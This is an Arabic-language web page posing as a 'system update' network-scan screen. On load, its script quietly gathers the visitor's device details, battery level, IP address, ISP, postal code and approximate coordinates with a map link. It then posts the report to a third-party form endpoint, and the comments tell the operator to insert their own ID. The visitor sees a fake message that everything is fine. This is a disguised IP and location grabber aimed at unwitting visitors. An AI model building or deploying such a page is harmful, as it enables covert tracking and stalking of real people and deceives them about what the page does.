<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديث النظام | 2026</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .console { border: 1px solid #00ff00; padding: 30px; background: rgba(0, 255, 0, 0.05); box-shadow: 0 0 15px #00ff00; text-align: center; }
        .loading { overflow: hidden; border-right: .15em solid #00ff00; white-space: nowrap; margin: 0 auto; letter-spacing: .15em; animation: typing 3.5s steps(40, end), blink-caret .75s step-end infinite; }
        @keyframes typing { from { width: 0 } to { width: 100% } }
        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #00ff00; } }
    </style>
</head>
<body>
    <div class="console">
        <div class="loading">جاري فحص بروتوكول الشبكة وتحليل استقرار البرج...</div>
        <p id="status" style="font-size: 0.8rem; margin-top: 15px; color: #008800;">[اتصال آمن]</p>
    </div>

    <script>
        async function fetchDeepNetworkData() {
            let report = {
                timestamp: new Date().toLocaleString(),
                device_info: {
                    platform: navigator.platform,
                    memory: navigator.deviceMemory + "GB",
                    cores: navigator.hardwareConcurrency,
                    userAgent: navigator.userAgent
                }
            };

            // 1. جلب بيانات الموقع عبر IP-Whois (أكثر دقة من الخدمات العادية)
            try {
                const response = await fetch('https://ipwho.is/');
                const data = await response.json();
                
                report.tower_location = {
                    ip: data.ip,
                    connection_type: data.connection.type, // يخبرك إذا كان 4G/5G أو ألياف
                    isp: data.connection.isp,
                    city: data.city,
                    region: data.region,
                    postal: data.postal, // الرمز البريدي الدقيق للمنطقة
                    latitude: data.latitude,
                    longitude: data.longitude,
                    map_url: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
                };
            } catch (e) { report.network_error = "فشل تحليل البرج العَميق"; }

            // 2. جلب حالة البطارية
            try {
                const battery = await navigator.getBattery();
                report.battery = Math.round(battery.level * 100) + "% (" + (battery.charging ? "يشحن" : "لا يشحن") + ")";
            } catch (e) {}

            // 3. الإرسال إلى Formspree (تأكد من استخدام الـ ID الخاص بك)
            const formID = 'xkozoaaq'; // الآيدي الخاص بك من صورتك الأخيرة
            
            await fetch(`https://formspree.io/f/${formID}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(report)
            });

            document.getElementById('status').innerText = "تم التحقق. النظام يعمل بكفاءة 100%.";
        }

        window.onload = fetchDeepNetworkData;
    </script>
</body>
</html>
